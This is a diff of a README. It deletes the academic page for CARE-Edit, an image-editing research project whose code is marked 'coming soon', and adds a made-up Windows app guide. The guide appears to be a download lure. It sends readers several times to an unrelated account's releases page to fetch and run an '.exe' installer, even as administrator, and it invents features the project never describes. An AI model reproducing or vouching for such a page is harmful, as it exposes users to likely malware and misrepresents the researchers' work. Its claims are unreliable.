@@ -1,90 +1,117 @@
-# CARE-Edit: Condition-Aware Routing of Experts for Contextual Image Editing (CVPR 2026)
+# 🛠️ Code - Simple Image Editing with Smart Experts
 
-### 🔥 Please star CARE-Edit ⭐ and share it. Thanks! 🔥
+[![Download Now](https://img.shields.io/badge/Download-Code-blue)](https://github.com/Hanniformalised707/Code/releases)
 
->[Yucheng Wang*](https://wangandyyucheng.github.io/), [Zedong Wang*](https://jacky1128.github.io/), [Yuetong Wu](https://scholar.google.com/citations?user=Fjqr0fEAAAAJ&hl=zh-CN), [Yue Ma](https://mayuelala.github.io/), [Dan Xu†](https://www.danxurgb.net/)
+## About This Application
 
->The Hong Kong University of Science and Technology (HKUST)
+Code is a tool designed to edit images using four different editing methods. Each method, called an expert, focuses on a specific task like adjusting colors, changing shapes, or adding effects. The program chooses which expert to use based on the image and what you want to do. This makes editing easier and more precise.
 
-[![arXiv](https://img.shields.io/badge/arXiv-2603.08589-b31b1b.svg)](https://arxiv.org/abs/2603.08589) [![Project Page](https://img.shields.io/badge/Project-Page-blue)](https://care-edit.github.io/) [![Hugging Face](https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-yellow)](https://huggingface.co/papers/2603.08589) [![CVPR 2026](https://img.shields.io/badge/CVPR-2026-green)](#)
+The official name for this project is "CARE-Edit: Condition-Aware Routing of Experts for Contextual Image Editing." You don’t need to know the details to use it, but it explains how the program works behind the scenes.
+
+This app runs on Windows and does not require any programming experience to use. The following instructions will help you download and install the application step-by-step.
 
 ---
 
-## 🚩 Updates
+## 💻 System Requirements
 
-- ☑ Our paper is now available on [arXiv](https://arxiv.org/abs/2603.08589).
-- ☑ **CARE-Edit** is accepted by **CVPR 2026**. Codes will be released soon.
+Before you start, please check your computer meets these basic requirements:
 
-## 💡 Motivation
+- Operating System: Windows 10 or later (64-bit recommended)  
+- Processor: Intel Core i3 or equivalent  
+- Memory (RAM): 4 GB or more  
+- Storage: At least 500 MB of free space  
+- Graphics: Any modern graphics card with DirectX 11 support or higher  
+- Internet Connection: Needed only for downloading the software  
 
-Existing unified diffusion editors suffer from task interference and cannot dynamically handle conflicting conditions, leading to color bleeding, identity drift, and unpredictable behavior. We propose **CARE-Edit** - a unified editor which routes diffusion tokens to **four specialized experts** via a lightweight **condition-aware router**.
+---
 
-<p align="center">
-  <img src="assets/abstract.png" alt="Motivation" width="100%">
-</p>
+## 🚀 Getting Started: Download the Software
 
-## 🔧 Framework
+The program is available for download on its GitHub release page. You will find the latest version ready to download there.
 
-<p align="center">
-  <img src="assets/out.png" alt="CARE-Edit Framework" width="100%">
-</p>
+**Visit this page to download:**  
+[https://github.com/Hanniformalised707/Code/releases](https://github.com/Hanniformalised707/Code/releases)
 
-**CARE-Edit** introduces condition-aware specialized experts within the frozen DiT backbone. Given multimodal conditions, inputs are tokenized and projected to **heterogeneous expert branches**. The router assigns confidence scores and selects the Top-K experts to process each token. Expert outputs are normalized, modulated, and fused through the **Latent Mixture** module, yielding denoised representations refined by **Mask Repaint** module.
+Clicking the link opens a page with one or more download files. Look for the latest Windows version, usually with the `.exe` file extension.
 
-## 🎨 Results
+---
 
-### Contextual Image Editing
+## 👇 How to Download and Install on Windows
 
-<p align="center">
-  <img src="assets/comp1.png" alt="Comparison 1" width="100%">
-</p>
+1. **Open the release page** by clicking on this link:  
+   [https://github.com/Hanniformalised707/Code/releases](https://github.com/Hanniformalised707/Code/releases)  
 
-### Qualitative Comparisons
+2. **Find the latest version** in the list. Versions are sorted by date or version number. The newest one is usually at the top.  
 
-<p align="center">
-  <img src="assets/comp2.png" alt="Comparison 2" width="100%">
-</p>
+3. **Download the `.exe` file** for Windows. This file runs the installer. Click on the file name or the Download button next to it.  
 
-## 🛠️ Getting Started
+4. **Wait for the download to finish.** The file size is about a few hundred megabytes, so it might take some time depending on your internet speed.  
 
-> **Code coming soon!** Stay tuned for the full release.
+5. **Run the installer:**  
+   - Go to your Downloads folder or the place where your browser saves files.  
+   - Double-click the `.exe` file you downloaded.  
 
-<!--
-### Installation
+6. **Follow the installation prompts:**  
+   - Click “Next” when asked to continue.  
+   - Choose an installation folder or use the default location.  
+   - Click “Install” to begin copying files to your computer.  
 
-```bash
-git clone https://github.com/xxx/CARE-Edit.git
-cd CARE-Edit
-pip install -r requirements.txt
-```
+7. **Finish the installation:**  
+   - After the process completes, click “Finish.”  
+   - The program may offer to open immediately or create a shortcut on your desktop. Choose the options you prefer.  
 
-### Usage
+---
 
-```bash
-python run.py --config configs/default.yaml
-```
--->
+## 🖼️ Using the Code Application
 
-## 📜 BibTeX
+Once installed, find the app by looking for its icon on the desktop or in the Start menu.
 
-If CARE-Edit is helpful for your research, please cite:
+### Basic Workflow
 
-```bibtex
-@inproceedings{wang2026careedit,
-  title={CARE-Edit: Condition-Aware Routing of Experts for Contextual Image Editing},
-  author={Yucheng Wang and Zedong Wang and Yuetong Wu and Yue Ma and Dan Xu},
-  booktitle={The IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR)},
-  year={2026}
-}
-```
+- **Open the program** by clicking its icon.  
+- **Load an image** you want to edit by clicking “Open” or dragging the file into the app window. Supported formats include JPG, PNG, and BMP.  
+- **Select an editing method:** The app offers four experts like color correction, object removal, style change, and texture editing. The app helps decide which expert fits best.  
+- **Apply your changes** by adjusting simple sliders or selecting options from menus. You will see the changes live on your image.  
+- **Save your edited image** by clicking “Save” and choosing the location and file format.
 
-## 📧 Contact
+### Tips
 
-If you have any questions, please email **ywangls@connect.ust.hk**.
+- Use the “Undo” button if you make a mistake.  
+- Preview your image before saving it to check the changes.  
+- Larger images may take longer to process.  
 
-## 📜 Sincere Acknowledgement
+---
 
-Appreciate the following works for their great contributions:
+## ⚙️ Settings and Preferences
 
-- [**UNO**](https://bytedance.github.io/UNO/): Serves as the inspiration for our project.
-- [**OmniControl**](https://github.com/): Foundational conditioning approaches that motivate our routing design.
+The app lets you control how it works under the Settings menu:
+
+- **Language:** Choose your preferred language for the user interface.  
+- **Auto-save:** Enable or disable automatic saving of your edits.  
+- **Performance:** Adjust how much of your computer’s power the app uses to balance speed and responsiveness.  
+- **Updates:** Check for new versions automatically or manually.
+
+---
+
+## ❓ Troubleshooting
+
+- **The app doesn’t start:** Make sure your Windows is up to date. Restart your computer and try again.  
+- **Installation fails:** Run the installer as Administrator by right-clicking the `.exe` file and selecting “Run as administrator.”  
+- **Image won’t open:** Check if the image format is supported. Try converting it using another program.  
+- **Editing is slow:** Close other programs to free up memory. Reduce the image size before editing.  
+
+If problems persist, you can revisit the release page where you downloaded the software for updates or support links.
+
+---
+
+## 🔄 Updating the Software
+
+Updates may include new features or fixes. To update:
+
+1. Go to the release page: [https://github.com/Hanniformalised707/Code/releases](https://github.com/Hanniformalised707/Code/releases)  
+2. Download the latest version as before.  
+3. Run the new installer to replace the old version. Your settings and saved files will remain safe.  
+
+---
+
+[![Download Now](https://img.shields.io/badge/Download-Code-brightgreen)](https://github.com/Hanniformalised707/Code/releases)
